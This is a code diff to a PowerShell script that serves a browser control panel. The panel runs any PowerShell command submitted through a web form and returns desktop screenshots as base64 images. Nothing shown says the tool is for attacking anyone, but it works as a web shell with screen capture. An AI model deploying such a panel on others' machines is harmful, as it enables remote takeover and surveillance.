@@ -49,7 +49,7 @@ $html = @"
         input, textarea { background: #404040; color: #fff; border: 1px solid #555; }
         button { background: #4CAF50; color: white; cursor: pointer; }
         button:hover { background: #45a049; }
-        .output { background: #000; padding: 10px; margin: 10px 0; border-radius: 3px; font-family: monospace; white-space: pre-wrap; }
+        .output { background: #000; padding: 10px; margin: 10px 0; border-radius: 3px; font-family: monospace; white-space: pre-wrap; max-height: 500px; overflow-y: auto; }
         .file-upload { border: 2px dashed #555; padding: 20px; margin: 10px 0; text-align: center; }
     </style>
 </head>
@@ -59,8 +59,8 @@ $html = @"
         
         <div class="section">
             <h3>💻 Command Terminal</h3>
-            <form action="/cmd" method="post">
-                <input type="text" name="command" placeholder="Enter PowerShell command..." required>
+            <form action="/cmd" method="post" id="cmdForm">
+                <input type="text" name="command" placeholder="Enter PowerShell command..." required id="cmdInput">
                 <button type="submit">Execute</button>
             </form>
         </div>
@@ -104,6 +104,21 @@ $html = @"
                     document.getElementById('output').innerHTML = data;
                 });
         }, 2000);
+        
+        // Handle command form submission
+        document.getElementById('cmdForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const command = document.getElementById('cmdInput').value;
+            const formData = new FormData();
+            formData.append('command', command);
+            
+            fetch('/cmd', {
+                method: 'POST',
+                body: formData
+            }).then(() => {
+                document.getElementById('cmdInput').value = '';
+            });
+        });
     </script>
 </body>
 </html>
@@ -202,9 +217,15 @@ while ($listener.IsListening) {
                     $bitmap = New-Object System.Drawing.Bitmap($bounds.Width, $bounds.Height)
                     $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
                     $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
-                    $screenshotPath = "C:\temp\screenshot.png"
-                    $bitmap.Save($screenshotPath, [System.Drawing.Imaging.ImageFormat]::Png)
-                    $outputBuffer += "Screenshot saved: $screenshotPath`n"
+                    
+                    # Convert to base64 for direct display
+                    $memoryStream = New-Object System.IO.MemoryStream
+                    $bitmap.Save($memoryStream, [System.Drawing.Imaging.ImageFormat]::Png)
+                    $imageBytes = $memoryStream.ToArray()
+                    $base64Image = [System.Convert]::ToBase64String($imageBytes)
+                    
+                    $outputBuffer += "<img src='data:image/png;base64,$base64Image' style='max-width:100%; height:auto;' />`n"
+                    $outputBuffer += "Screenshot captured successfully!`n"
                 } catch {
                     $outputBuffer += "Screenshot failed: $_`n"
                 }
